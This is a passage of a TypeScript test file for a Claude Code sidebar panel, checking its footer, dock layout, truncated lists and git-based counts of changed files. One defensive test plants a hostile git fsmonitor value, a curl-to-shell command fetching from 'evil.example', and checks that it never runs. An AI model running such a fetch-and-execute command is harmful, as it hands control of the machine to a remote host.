
    const lines = await panelLines($, 60);

    expect(lines).toContain("● Claude Code 2.1.300 · Opus 5.5 · xhigh");
    expect(lines.join("\n")).not.toContain("Update available");
  });

  test("leaves out the effort before the engine line would wrap", async ($, on) => {
    const h = await boot($, on, {}, IN_ZELLIJ, "2.1.310");
    await replied(h, $);

    const lines = await panelLines($, 36);

    const engine = lines.find((line) => line.startsWith("● Claude Code"));
    expect(engine).toBe("● Claude Code 2.1.300 · Opus 5.5");
    expect([...(engine ?? "")].length).toBeLessThanOrEqual(inner(36));
  });

  test("stays green when the release server cannot be reached", async ($, on) => {
    const h = await boot($, on, {}, IN_ZELLIJ, null);
    await h.clock.settle();

    expect(await dot($)).toBe(GREEN);
  });

  test("turns yellow within the hour once a release ships during the session", async ($, on) => {
    const h = await boot($, on);
    await h.clock.settle();

    h.latestRelease = "2.1.310";
    await h.clock.advance(HOUR);

    expect(await dot($)).toBe(YELLOW);
  });
});

describe("the footer", () => {
  test("shows the path, branch and git state, then the engine, model and effort", async ($, on) => {
    const h = await boot($, on);
    h.git.status =
      "# branch.oid 1a2b\n# branch.head opencode-sidebar\n# branch.ab +1 -0\n1 .M N... 100644 100644 100644 a b src/a.ts\n1 M. N... 100644 100644 100644 a b src/b.ts\n? notes.md\n";
    await briefed(h, $);
    const turnId = await startTurn($, "go");
    await replyStep(h, $, turnId, {
      text: "Working.",
      output: 100,
      ms: SECOND,
    });
    await endTurn($, turnId, { answer: "Done." });
    await h.clock.settle();

    const lines = await panelLines($);

    expect(lines).toContain("~/.dotfiles:opencode-sidebar !2 ?1 ⇡1");
    expect(lines).toContain("● Claude Code 2.1.300 · Opus 5.5 · xhigh");
  });

  test("shows the path alone outside a git repository", async ($, on) => {
    const h = await boot($, on);
    h.git.isDown = true;
    await briefed(h, $);

    const lines = await panelLines($);

    expect(lines).toContain("~/.dotfiles");
    expect(lines.some((line) => line.startsWith("⎇"))).toBe(false);
  });

  /** The session runs in a linked worktree of ~/.dotfiles, as Claude Code's own worktrees do. */
  async function inWorktree(h: Harness, $: Engine) {
    h.git.worktree = {
      root: "/home/dev/.dotfiles/.claude/worktrees/fit-dock",
      commonDir: "/home/dev/.dotfiles/.git",
    };
    h.git.status = "# branch.oid 1a2b\n# branch.head feat/fit-dock\n";
    await $.session.start({
      cwd: h.git.worktree.root,
      surface: "terminal",
      isInteractive: true,
    });
    await briefed(h, $);
  }

  test("keeps the branch and its marks when git status times out", async ($, on) => {
    const h = await boot($, on);
    h.git.status =
      "# branch.oid 1a2b\n# branch.head feat/gauges\n1 .M N... 100644 100644 100644 a b src/a.ts\n";
    await briefed(h, $);
    await h.clock.settle();
    const footer = async () => {
      const panel = await mountPanel($, { bodyColumns: 44 });
      const lines = (await shown(panel)).split("\n");
      await panel.unmount();
      return lines;
    };
    expect(await footer()).toContain("~/.dotfiles:feat/gauges !1");

    h.git.isTimingOut = true;
    await runTurn($, { prompt: "anything else?", answer: "No." });
    await h.clock.settle();

    expect(await footer()).toContain("~/.dotfiles:feat/gauges !1");
  });

  test("names the worktree under the main repository's path and branch", async ($, on) => {
    const h = await boot($, on, {}, IN_ZELLIJ, "2.1.300", false);
    await inWorktree(h, $);

    const lines = await panelLines($, 60);
    const where = lines.indexOf("~/.dotfiles:feat/fit-dock");

    expect(where).toBeGreaterThan(-1);
    expect(lines[where + 1]).toBe("⎇ worktree fit-dock");
    expect(lines[where + 2]).toBe("● Claude Code 2.1.300 · Opus 5.5");
  });

  test("leaves no row for a worktree in a normal checkout", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    const lines = await panelLines($, 60);
    const where = lines.indexOf("~/.dotfiles:main");

    expect(lines[where + 1]).toBe("● Claude Code 2.1.300 · Opus 5.5");
    expect(lines.some((line) => line.startsWith("⎇"))).toBe(false);
  });

  test("keeps the worktree row with the footer however short the dock", async ($, on) => {
    const h = await boot($, on, {}, IN_ZELLIJ, "2.1.300", false);
    await inWorktree(h, $);

    for (const bodyRows of [12, 9]) {
      const panel = await mountPanel($, {
        bodyColumns: 60,
        scroll: { offset: 0, bodyRows },
      });
      const lines = (await shown(panel)).split("\n");
      await panel.unmount();

      expect(lines.slice(-3)).toEqual([
        "~/.dotfiles:feat/fit-dock",
        "⎇ worktree fit-dock",
        "● Claude Code 2.1.300 · Opus 5.5",
      ]);
    }
  });
});

describe("the dock", () => {
  test("leaves the terminal's own background under the panel by default", async ($, on) => {
    await boot($, on);

    const panel = await mountPanel($);

    expect(boxProps(await panel.drawn()).backgroundColor).toBeUndefined();
  });

  test(
    "paints the panel the colour its setting names",
    { options: { panelBackground: "#22272e" } },
    async ($, on) => {
      await boot($, on);

      const panel = await mountPanel($);

      expect(boxProps(await panel.drawn()).backgroundColor).toBe("#22272e");
    }
  );

  test(
    "leaves the terminal's background when the setting is no hex colour",
    { options: { panelBackground: "dark grey" } },
    async ($, on) => {
      await boot($, on);

      const panel = await mountPanel($);

      expect(boxProps(await panel.drawn()).backgroundColor).toBeUndefined();
    }
  );

  test("fills the dock's height, so the bottom sections sit at its bottom", async ($, on) => {
    await boot($, on);

    const panel = await mountPanel($, { scroll: { offset: 0, bodyRows: 40 } });

    expect(boxProps(await panel.drawn()).height).toBe(40);
  });

  // The kit draws trees without laying them out: these hold the layout's rules; a live run checks the result.
  test("keeps the footer on screen when the panel holds more than the dock, the top giving way first", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    const parts = childrenOf(
      await (
        await mountPanel($, { scroll: { offset: 0, bodyRows: 12 } })
      ).drawn()
    );
    const [top, , bottom, footer] = parts;

    expect(textOf(footer)).toContain("● Claude Code");
    expect(boxProps(footer!).flexShrink).toBe(0);
    expect(textOf(top)).toContain("Fuse gauges with near-limit bars");
    expect(boxProps(top!)).toMatchObject({ overflow: "hidden", minHeight: 0 });
    expect(boxProps(bottom!)).toMatchObject({
      overflow: "hidden",
      minHeight: 0,
      justifyContent: "flex-end",
    });
    expect(Number(boxProps(top!).flexShrink)).toBeGreaterThan(
      Number(boxProps(bottom!).flexShrink)
    );
  });

  test("separates the sections by one blank row", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await measure($, {
      tokens: 142_000,
      percent: 71,
      limits: [
        { kind: "five_hour", percentUsed: 31, resetsAt: h.clock.now() + HOUR },
      ],
    });

    const lines = await panelLines($);
    const limits = lines.findIndex((line) => line.startsWith("LIMITS"));

    expect(lines.slice(limits - 2, limits).map(isBlank)).toEqual([false, true]);
  });

  test("draws each bar half a row tall, so the next window has room without a blank row", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const reset = h.clock.now() + 2 * HOUR;
    await measure($, {
      tokens: 10_000,
      percent: 5,
      limits: [
        { kind: "five_hour", percentUsed: 31, resetsAt: reset },
        { kind: "seven_day", percentUsed: 40, resetsAt: reset + 24 * HOUR },
      ],
    });

    const lines = await panelLines($);
    const hours = lines.findIndex((line) => line.startsWith("5 hours"));

    expect(lines[hours + 1]).toMatch(/^▀+$/);
    expect(lines[hours + 2]?.startsWith("Week")).toBe(true);
  });

  test("keeps a column of room on each side and none above and below", async ($, on) => {
    await boot($, on);

    const panel = await mountPanel($);

    expect(boxProps(await panel.drawn())).toMatchObject({
      paddingX: 1,
      paddingY: 0,
    });
  });
});

describe("fitting the dock", () => {
  const STORY =
    "You asked to resume this session and keep other sessions from writing to its transcript. The shelf count and spacing fixes are done and republished.";

  /** Every section filled: a recap with steps, a todo plan, live work, a changed file, context with a note, speed, two limit windows with notes, and another session waiting. */
  async function busy(h: Harness, $: Engine) {
    await briefed(h, $, { ...BRIEF, story: STORY });
    h.git.changed["/home/dev/.dotfiles/app.rb"] = "12\t3";
    const reset = h.clock.now() + 4 * HOUR;
    const week = h.clock.now() + 4 * 24 * HOUR;
    const limits = (hours: number, days: number) => [
      { kind: "five_hour", percentUsed: hours, resetsAt: reset },
      { kind: "seven_day", percentUsed: days, resetsAt: week },
    ];
    await measure($, {
      tokens: 120_000,
      percent: 60,
      usd: 2.1,
      limits: limits(25, 30),
    });
    await h.clock.advance(HOUR);
    const turnId = await startTurn($, "go");
    await replyStep(h, $, turnId, {
      text: "Editing.",
      output: 880,
      ms: 10 * SECOND,
    });
    await $.tool.call({ tool: "TodoWrite", todos: TODOS } as never);
    await $.tool.call(edit("/home/dev/.dotfiles/app.rb"));
    await measure($, {
      tokens: 142_000,
      percent: 71,
      usd: 3.41,
      limits: limits(31, 33),
    });
    // Another session waits now; one quiet for over three minutes would have been dropped.
    otherSession(h, {
      id: "other-1",
      name: "Bookshelf plans",
      state: "waiting",
      question: "Order the shelves?",
    });
    await h.clock.advance(POLL);
  }

  const ROLLED = [
    "▸ SPEED",
    "▸ RECAP",
    "▸ CHANGED",
    "▸ PLAN",
    "▸ LIMITS",
    "▸ CONTEXT",
    "▸ NEEDS YOU",
    "▸ hidden:",
  ];

  /** Shrinks the dock a row at a time, checking every height; the height and row at which each rolled marker first shows. */
  async function shrink($: Engine) {
    const firstAt: Record<string, number> = {};
    const firstRow: Record<string, string> = {};
    for (let height = 57; height >= 8; height--) {
      const shown = await dock($, height);
      expect(shown.all.length).toBeLessThanOrEqual(height);
      expect(shown.all.every((row) => [...row].length <= inner(DOCK))).toBe(
        true
      );
      expect(shown.top[0]).toBe("Fuse gauges with near-limit bars");
      expect(shown.top[1]?.startsWith("◐ Working")).toBe(true);
      expect(shown.footer.at(-1)?.startsWith("● Claude Code")).toBe(true);
      for (const marker of ROLLED) {
        const row = shown.all.find((one) => one.startsWith(marker));
        if (row !== undefined && firstAt[marker] === undefined) {
          firstAt[marker] = height;
          firstRow[marker] = row;
        }
      }
    }
    return { firstAt, firstRow };
  }

  test("shows everything in full when the dock has room, the spare rows between CHANGED and CONTEXT", async ($, on) => {
    const h = await boot($, on);
    await busy(h, $);

    const shown = await dock($, 57);

    expect(shown.all.some((row) => row.startsWith("▸"))).toBe(false);
    expect(shown.top.some((row) => row.startsWith("CHANGED"))).toBe(true);
    expect(
      shown.bottom.find((row) => row.trim() !== "")?.startsWith("CONTEXT")
    ).toBe(true);
    expect(
      shown.top.some(
        (row) => row.startsWith("12m") || row.includes("block bars switched")
      )
    ).toBe(true);
  });

  test("puts CHANGED right after NOW, one blank row between", async ($, on) => {
    const h = await boot($, on);
    await busy(h, $);

    const { top } = await dock($, 57);
    const now = top.indexOf("NOW");
    const changed = top.findIndex((row) => row.startsWith("CHANGED"));

    expect(now).toBeGreaterThan(-1);
    expect(top[changed - 1]?.trim()).toBe("");
    expect(
      top.slice(now + 1, changed - 1).every((row) => row.trim() !== "")
    ).toBe(true);
  });

  test("rolls sections up in the agreed order as the dock shrinks, keeping the title, state and footer", async ($, on) => {
    const h = await boot($, on);
    await busy(h, $);

    const { firstAt } = await shrink($);
    const heights = ROLLED.map((marker) => firstAt[marker] ?? 0);

    expect(ROLLED.filter((marker) => firstAt[marker] === undefined)).toEqual(
      []
    );
    expect([...heights].sort((a, b) => b - a)).toEqual(heights);
  });

  test("says what each rolled section holds", async ($, on) => {
    const h = await boot($, on);
    await busy(h, $);

    const { firstRow } = await shrink($);

    expect(firstRow["▸ SPEED"]).toMatch(
      /^▸ SPEED  88 t\/s +avg \d+ · peak \d+$/
    );
    expect(firstRow["▸ RECAP"]).toMatch(
      /^▸ RECAP  You asked to resume.*… +\+\d+ lines$/
    );
    expect(firstRow["▸ CHANGED"]).toMatch(/^▸ CHANGED +\+12 −3 · 1 file$/);
    expect(firstRow["▸ PLAN"]).toMatch(
      /^▸ PLAN  ◐ Write the failing tests +1 \/ 3$/
    );
    expect(firstRow["▸ LIMITS"]?.trimEnd()).toBe(
      "▸ LIMITS  5 hours 31% · Week 33%"
    );
    expect(firstRow["▸ CONTEXT"]).toMatch(
      /^▸ CONTEXT  71% +142k of 200k tokens$/
    );
    expect(firstRow["▸ NEEDS YOU"]).toMatch(/^▸ NEEDS YOU +1 of \d+ sessions$/);
    expect(firstRow["▸ hidden:"]).toMatch(/^▸ hidden: [A-Z]/);
  });
});

describe("lists that fill the dock", () => {
  const FILES = Array.from({ length: 12 }, (_, i) => `f${pad(i + 1)}.ts`);
  /** The files as CHANGED lists them: the last edited first. */
  const NEWEST = [...FILES].reverse();
  const isFile = (row: string): boolean => /^f\d+\.ts /.test(row);

  /** Claude edits each file in turn, f01.ts first; each changes as many lines as `lines` says, else 10. */
  async function editFiles(
    h: Harness,
    $: Engine,
    names: readonly string[],
    lines: (name: string) => number = () => 10
  ) {
    for (const name of names)
      h.git.changed[`${CWD}/${name}`] = `${lines(name)}\t0`;
    for (const name of names) await $.tool.call(edit(`${CWD}/${name}`));
    await h.clock.settle();
  }

  /** A todo list with one item done, one under way and `pending` more to go. */
  const todos = (pending: number) => [
    TODOS[0],
    TODOS[1],
    ...Array.from({ length: pending }, (_, i) => ({
      content: `Step ${pad(i + 1)}`,
      status: "pending",
      activeForm: `Doing step ${i + 1}`,
    })),
  ];
  const isOpenItem = (row: string): boolean => /^[◐○] /.test(row);

  test("lists as many changed files as the dock has room for, then how many more", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "go");
    await editFiles(h, $, FILES);

    const shown = await dock($, 24);
    const changed = section(shown.all, "CHANGED");
    const listed = changed.filter(isFile).map((row) => row.split(" ")[0]);

    expect(shown.all).toHaveLength(24);
    expect(listed.length).toBeGreaterThan(3);
    expect(listed).toEqual(NEWEST.slice(0, listed.length));
    expect(changed.at(-1)).toBe(`… ${FILES.length - listed.length} more files`);
  });

  test("lists every changed file when the dock has room for them all", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "go");
    await editFiles(h, $, FILES);

    const changed = section((await dock($, 50)).all, "CHANGED");

    expect(changed.slice(1).map((row) => row.split(" ")[0])).toEqual(NEWEST);
  });

  test("lists one more file for each row the dock grows, and the last file rather than a line saying one more", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "go");
    await editFiles(h, $, FILES);

    const counts: number[] = [];
    for (let height = 22; height <= 34; height++) {
      const shown = await dock($, height);
      counts.push(section(shown.all, "CHANGED").filter(isFile).length);
      expect(shown.all).not.toContain("… 1 more files");
    }
    const first = counts[0] ?? 0;

    expect(first).toBeGreaterThan(3);
    expect(counts.slice(0, counts.indexOf(FILES.length) + 1)).toEqual([
      ...Array.from({ length: 11 - first }, (_, i) => first + i),
      FILES.length,
    ]);
  });

  test("keeps each file's bar the same size however many files the dock lists", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "go");
    await editFiles(h, $, FILES, (name) => (name === "f01.ts" ? 100 : 10));

    const all = section((await dock($, 50)).all, "CHANGED");
    const some = section((await dock($, 24)).all, "CHANGED");

    expect(some.at(-1)).toMatch(/more files$/);
    expect(some[1]).toBe(all[1]);
  });

  test("lists as many subagents as the dock has room for, then how many more", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "research it");
    const names = [
      "Terminal tools",
      "GUI orchestrators",
      "In-session HUDs",
      "Social buzz",
      "Release notes",
      "Pricing pages",
      "Issue trackers",
      "Forum threads",
    ];
    for (const name of names) {
      const id = await spawnAgent($, name);
      await $.tool.call({
        tool: "WebSearch",
        query: name,
        agentId: id,
      } as never);
    }
    const listedIn = (rows: string[]) =>
      rows
        .filter((row) => row.startsWith("◐ "))
        .map((row) => row.slice(2).split("  ")[0]);

    const tall = section((await dock($, 50)).all, "AGENTS");
    const shown = await dock($, 30);
    const agents = section(shown.all, "AGENTS");
    const listed = listedIn(agents);

    expect(listedIn(tall)).toEqual(names);
    expect(tall).toContain("  Searching the web for Forum threads");
    expect(listed.length).toBeGreaterThan(4);
    expect(listed).toEqual(names.slice(0, listed.length));
    expect(agents.at(-1)).toBe(`… ${names.length - listed.length} more`);
    // A subagent takes two rows, so one row may be left over.
    expect(shown.all.length).toBeGreaterThanOrEqual(29);
  });

  test("lists as many of the plan's open items as the dock has room for, then how many more", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "go");
    await $.tool.call({ tool: "TodoWrite", todos: todos(10) } as never);
    const open = [
      "◐ Write the failing tests",
      ...todos(10)
        .slice(2)
        .map((item) => `○ ${item.content}`),
    ];

    const tall = section((await dock($, 50)).all, "PLAN");
    const shown = await dock($, 24);
    const plan = section(shown.all, "PLAN");
    const listed = plan.filter(isOpenItem);

    expect(tall.filter(isOpenItem)).toEqual(open);
    expect(tall.some((row) => row.startsWith("…"))).toBe(false);
    expect(shown.all).toHaveLength(24);
    expect(listed.length).toBeGreaterThan(3);
    expect(listed).toEqual(open.slice(0, listed.length));
    expect(plan.at(-1)).toBe(`… ${open.length - listed.length} more`);
  });

  test("lists as many sessions that need you as the dock has room for, then how many more", async ($, on) => {
    const h = await boot($, on);
    const names = [
      "Bookshelf plans",
      "Nightly backup gap",
      "Newsletter sync",
      "Invoice export",
      "Garden notes",
      "Photo archive",
      "Recipe box",
    ];
    // The first waited longest, so it is listed first.
    for (const [i, name] of names.entries())
      otherSession(h, {
        id: `other-${i}`,
        name,
        state: "waiting",
        question: `${name}?`,
        since: h.clock.now() - (names.length - i) * MINUTE,
      });
    await briefed(h, $);
    await h.clock.advance(POLL);
    const listedIn = (rows: string[]) =>
      rows
        .filter((row) => row.startsWith("◆ "))
        .map((row) => row.slice(2).split("  ")[0]);

    const tall = section((await dock($, 50)).all, "NEEDS YOU");
    const shown = await dock($, 26);
    const needs = section(shown.all, "NEEDS YOU");
    const listed = listedIn(needs);

    expect(listedIn(tall)).toEqual(names);
    expect(tall).toContain("Recipe box?");
    expect(listed.length).toBeGreaterThan(3);
    expect(listed).toEqual(names.slice(0, listed.length));
    expect(needs.at(-1)).toBe(`… ${names.length - listed.length} more`);
    // A session takes two rows, so one row may be left over.
    expect(shown.all.length).toBeGreaterThanOrEqual(25);
  });

  test("shares the spare rows between two long lists in turn", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "go");
    await $.tool.call({ tool: "TodoWrite", todos: todos(10) } as never);
    await editFiles(h, $, FILES);

    const shown = await dock($, 36);
    const items = section(shown.all, "PLAN").filter(isOpenItem).length;
    const files = section(shown.all, "CHANGED").filter(isFile).length;

    expect(shown.all).toHaveLength(36);
    expect(items).toBeGreaterThan(3);
    expect(files).toBeGreaterThan(3);
    expect(Math.abs(items - files)).toBeLessThanOrEqual(1);
  });
});

describe("a conversation the mod never saw start", () => {
  /** After /clear or /resume Claude Code raises no session.start: only draws. The first sets the session up. */
  async function drawnTwice(h: Harness, $: Engine): Promise<string[]> {
    const first = await mountPanel($, { bodyColumns: 60 });
    await first.drawn();
    await first.unmount();
    await h.clock.advance(1);
    return (await shown(await mountPanel($, { bodyColumns: 60 }))).split("\n");
  }

  test("draws the footer once a draw finds it missing, as after /clear", async ($, on) => {
    const h = await boot($, on, {}, IN_ZELLIJ, "2.1.300", false);

    const lines = await drawnTwice(h, $);

    expect(lines).toContain("● Claude Code 2.1.300 · Opus 5.5");
    expect(lines.some((line) => line.startsWith("~/.dotfiles:main"))).toBe(
      true
    );
  });

  const SAVED = {
    title: "Keep focus when a window closes",
    story: "Closing a window lost focus. We patched the fork.",
    now: { state: "done", text: "merged into the fork branch" },
    steps: [],
    isPinned: false,
    updatedAt: START - 3 * MINUTE,
  };

  test("brings back a resumed conversation's brief from the store", async ($, on) => {
    const h = await boot(
      $,
      on,
      { [`brief:${SESSION}`]: SAVED },
      IN_ZELLIJ,
      "2.1.300",
      false
    );

    const lines = await drawnTwice(h, $);

    expect(lines[0]).toBe("Keep focus when a window closes");
  });

  test("keeps telling the other sessions it is here after a late setup", async ($, on) => {
    // A session is listed once it has a title: here the resumed conversation's brief.
    const h = await boot(
      $,
      on,
      { [`brief:${SESSION}`]: SAVED },
      IN_ZELLIJ,
      "2.1.300",
      false
    );
    await drawnTwice(h, $);
    const file = `${PRESENCE}/${SESSION}.json`;
    delete h.files[file];

    await h.clock.advance(MINUTE);

    expect(h.files[file]).toBeDefined();
  });
});

/** The panel's rows after the draw that sets a conversation up, and the draw after it. */
async function linesAfterSetUp(h: Harness, $: Engine): Promise<string[]> {
  const first = await mountPanel($, { bodyColumns: 60 });
  await first.drawn();
  await first.unmount();
  await h.clock.advance(1);
  return (await shown(await mountPanel($, { bodyColumns: 60 }))).split("\n");
}

/** Whether git ran in `dir` only inside the session's folder, its path spelled with no `..`. */
const isInsideProject = (dir: string): boolean =>
  (dir === CWD || dir.startsWith(`${CWD}/`)) && !dir.split("/").includes("..");

describe("git, in the session's own folders only", () => {
  test("never lets the repository's fsmonitor run: at the start, after a turn or after an edit", async ($, on) => {
    const h = await boot($, on, {}, IN_ZELLIJ, "2.1.300", false);
    h.git.fsmonitor = "sh -c 'curl https://evil.example | sh'";
    await $.session.start({
      cwd: CWD,
      surface: "terminal",
      isInteractive: true,
    });
    await briefed(h, $);
    h.git.changed[`${CWD}/app.rb`] = "12\t3";

    const turnId = await startTurn($, "edit it");
    await $.tool.call(edit(`${CWD}/app.rb`));
    await endTurn($, turnId, { answer: "Done." });
    await h.clock.settle();

    expect(h.git.dirs).toContain(CWD);
    expect(h.git.fsmonitorRuns).toEqual([]);
    expect(section(await panelLines($), "CHANGED")[0]).toContain("+12");
  });

  test("leaves .git/index alone, so a commit the person runs meanwhile finds no lock", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    h.git.changed[`${CWD}/app.rb`] = "12\t3";

    const turnId = await startTurn($, "edit it");
    await $.tool.call(edit(`${CWD}/app.rb`));
    await endTurn($, turnId, { answer: "Done." });
    await h.clock.settle();

    expect(section(await panelLines($), "CHANGED")[0]).toContain("+12");
    expect(h.git.indexWrites).toEqual([]);
  });

  test("runs no git outside the session's folder, and leaves those files off the list", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const outside = `${HOME}/Downloads/evil`;
    h.git.changed[`${outside}/x.ts`] = "5\t1";
    h.git.changed[`${CWD}/../Downloads/evil/y.ts`] = "7\t2";
    // ~/.config links into another repository: the mod's own source, edited from ~/.claude.
    const mod = `${HOME}/.config/claude-mods/sidecar/hooks/brief.ts`;
    h.git.changed[mod] = "40\t9";

    await startTurn($, "edit them");
    await $.tool.call(edit(`${outside}/x.ts`));
    await $.tool.call(edit(`${CWD}/../Downloads/evil/y.ts`));
    await $.tool.call(edit(mod));
    await $.tool.call({
      tool: "Write",
      file_path: `${HOME}/.claude/projects/dotfiles/memory/titles.md`,
      content: "one\ntwo\nthree\nfour",
    });
    await h.clock.settle();

    expect(h.git.dirs.filter((dir) => !isInsideProject(dir))).toEqual([]);
    expect(section(await panelLines($), "CHANGED")).toEqual([]);
  });

  test("lists no files where the session's folder is in no repository", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    h.git.isDown = true;

    await startTurn($, "edit it");
    await $.tool.call({
      tool: "Edit",
      file_path: `${CWD}/notes.md`,
      old_string: "a\nb",
      new_string: "c\nd\ne",
    });
    await $.tool.call({
      tool: "Write",
      file_path: `${CWD}/template.html`,
      content: "<p>hi</p>\n",
    });
    await h.clock.settle();

    expect(section(await panelLines($), "CHANGED")).toEqual([]);
  });

  test("counts a file named by a path relative to the session's folder", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    h.git.changed[`${CWD}/notes.md`] = "4\t0";

    await startTurn($, "write the notes");
    await $.tool.call(edit("notes.md"));
    await h.clock.settle();

    expect(section(await panelLines($), "CHANGED")[0]).toContain("+4");
  });

  test("counts a file in a folder added with /add-dir", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const added = `${HOME}/.config/claude-mods/sidebar`;
    await $.classic.DirectoryAdded({
      directory: added,
      source: "slash_command",
    } as never);
    h.git.changed[`${added}/hooks/git.ts`] = "9\t1";

    await startTurn($, "fix the mod");
    await $.tool.call(edit(`${added}/hooks/git.ts`));
    await h.clock.settle();

    expect(section(await panelLines($), "CHANGED")[0]).toContain("+9");
  });
});

describe("changed files' counts", () => {
  /**
   * What the CHANGED heading says on its right: `+12 −3 · 1 file`, or `1 file` alone. The panel
   * is unmounted after, so a test can read it again.
   */
  async function changedCounts($: Engine): Promise<string> {
    const panel = await mountPanel($, { bodyColumns: 44 });
    const lines = (await shown(panel)).split("\n");
    await panel.unmount();
    return (section(lines, "CHANGED")[0] ?? "").slice("CHANGED".length).trim();
  }

  /** A turn that edits app.rb while git counts it `12\t3`, ended and settled. */
  async function editedApp(h: Harness, $: Engine): Promise<void> {
    await briefed(h, $);
    h.git.changed[`${CWD}/app.rb`] = "12\t3";
    const turnId = await startTurn($, "edit it");
    await $.tool.call(edit(`${CWD}/app.rb`));
    await endTurn($, turnId, { answer: "Done." });
    await h.clock.settle();
  }

  test("lists only the files in git when Claude edits inside and outside the session's folder", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    h.git.changed[`${CWD}/app.rb`] = "12\t3";

    await startTurn($, "edit the app and note it");
    await $.tool.call(edit(`${CWD}/app.rb`));
    await $.tool.call(
      edit(`${HOME}/.claude/projects/dotfiles/memory/MEMORY.md`)
    );
    await h.clock.settle();
    const changed = section(await panelLines($), "CHANGED");

    expect(changed[0]).toMatch(/\+12 −3 · 1 file$/);
    expect(changed.join("\n")).not.toContain("MEMORY.md");
  });

  test("leaves a file .gitignore leaves out off the list, written or edited", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    h.git.ignored.push(`${CWD}/tmp/out.log`, `${CWD}/tmp/settings.yml`);

    const turnId = await startTurn($, "write the log, tune the settings");
    await $.tool.call({
      tool: "Write",
      file_path: `${CWD}/tmp/out.log`,
      content: "a\nb\nc\n",
    });
    await $.tool.call(edit(`${CWD}/tmp/settings.yml`));
    await endTurn($, turnId, { answer: "Done." });
    await h.clock.settle();

    expect(section(await panelLines($), "CHANGED")).toEqual([]);
  });

  test("drops the counts once the changes are committed outside Claude, as the next turn ends", async ($, on) => {
    const h = await boot($, on);
    await editedApp(h, $);
    expect(await changedCounts($)).toBe("+12 −3 · 1 file");

    delete h.git.changed[`${CWD}/app.rb`];
    await runTurn($, { prompt: "anything else?", answer: "No." });
    await h.clock.settle();

    expect(await changedCounts($)).toBe("1 file");
  });

  test("takes up the person's own changes to a file as the next turn ends", async ($, on) => {
    const h = await boot($, on);
    await editedApp(h, $);

    h.git.changed[`${CWD}/app.rb`] = "20\t3";
    await runTurn($, { prompt: "I added a few lines", answer: "Noted." });
    await h.clock.settle();

    expect(await changedCounts($)).toBe("+20 −3 · 1 file");
  });

  test("takes a file off the list once git no longer knows it, as the turn ends", async ($, on) => {
    const h = await boot($, on);
    await editedApp(h, $);

    h.git.isDown = true;
    await runTurn($, { prompt: "anything else?", answer: "No." });
    await h.clock.settle();

    expect(section(await panelLines($), "CHANGED")).toEqual([]);
  });

  test("drops the files git doesn't know from a list kept before, as the next turn ends", async ($, on) => {
    const kept = (path: string, name: string) => ({
      path,
      name,
      added: null,
      removed: null,
    });
    const h = await boot($, on, {
      [`work:${SESSION}`]: {
        todos: null,
        files: [
          kept(`${CWD}/app.rb`, "app.rb"),
          kept(
            `${HOME}/.claude/projects/dotfiles/memory/MEMORY.md`,
            "MEMORY.md"
          ),
          kept(`${HOME}/.claude/reports/template.html`, "template.html"),
        ],
      },
    });
    h.git.changed[`${CWD}/app.rb`] = "12\t3";

    await runTurn($, { prompt: "anything else?", answer: "No." });
    await h.clock.settle();
    const changed = section(await panelLines($), "CHANGED");

    expect(changed[0]).toMatch(/\+12 −3 · 1 file$/);
    expect(changed.join("\n")).not.toContain("MEMORY.md");
    expect(changed.join("\n")).not.toContain("template.html");
  });

  test("lists a tracked file Claude put back as it was with no counts", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const app = `${CWD}/app.rb`;
    h.git.changed[app] = "3\t2";

    await startTurn($, "edit it, then undo");
    await $.tool.call({
      tool: "Edit",
      file_path: app,
      old_string: "a\nb",
      new_string: "c\nd\ne",
    });
    delete h.git.changed[app];
    await $.tool.call({
      tool: "Edit",
      file_path: app,
      old_string: "c\nd\ne",
      new_string: "a\nb",
    });
    await h.clock.settle();

    expect(await changedCounts($)).toBe("1 file");
  });

  test("counts a file whose name reads as a pattern as itself, not as the files the pattern names", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    h.git.changed[`${CWD}/docs/v[12].md`] = "8\t0";
    // The person's own edit to a file `v[12].md` names as a pattern.
    h.git.changed[`${CWD}/docs/v1.md`] = "30\t5";

    await startTurn($, "write the notes for v12");
    await $.tool.call(edit(`${CWD}/docs/v[12].md`));
    await h.clock.settle();

    expect(await changedCounts($)).toBe("+8 · 1 file");
  });

  test("keeps a file put back as it was on the list when an ignored file's name matches it as a pattern", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    h.git.ignored.push(`${CWD}/docs/v1.md`);

    await startTurn($, "edit the notes, then undo");
    await $.tool.call(edit(`${CWD}/docs/v[12].md`));
    await h.clock.settle();

    expect(await changedCounts($)).toBe("1 file");
  });

  test("keeps a file and its counts when git times out as the turn ends", async ($, on) => {
    const h = await boot($, on);
    await editedApp(h, $);

    h.git.isTimingOut = true;
    await runTurn($, { prompt: "anything else?", answer: "No." });
    await h.clock.settle();

    expect(await changedCounts($)).toBe("+12 −3 · 1 file");
  });

  test("lists a file Claude edits while git times out, and counts it once git answers again", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    h.git.changed[`${CWD}/app.rb`] = "4\t1";
    h.git.isTimingOut = true;

    const turnId = await startTurn($, "edit it");
    await $.tool.call(edit(`${CWD}/app.rb`));
    await endTurn($, turnId, { answer: "Done." });
    await h.clock.settle();
    expect(await changedCounts($)).toBe("1 file");

    h.git.isTimingOut = false;
    await runTurn($, { prompt: "anything else?", answer: "No." });
    await h.clock.settle();

